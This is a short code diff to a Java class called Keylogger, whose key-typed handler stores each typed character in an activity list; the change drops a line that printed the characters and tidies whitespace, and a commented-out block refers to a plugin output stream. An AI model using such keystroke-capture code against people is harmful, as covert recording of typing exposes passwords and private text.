@@ -24,11 +24,8 @@ public class Keylogger implements NativeKeyListener {
 
 	@Override
 	public void nativeKeyTyped(NativeKeyEvent arg0) {		
-		try {			
-			
-			
+		try {					
 		    Activities.add(new Key(arg0.getKeyChar()));
-			System.out.println(arg0.getKeyChar());
 		    
 			/*if (LIVE RUNNING && KeyloggerPlugin.dos != null) {
 				
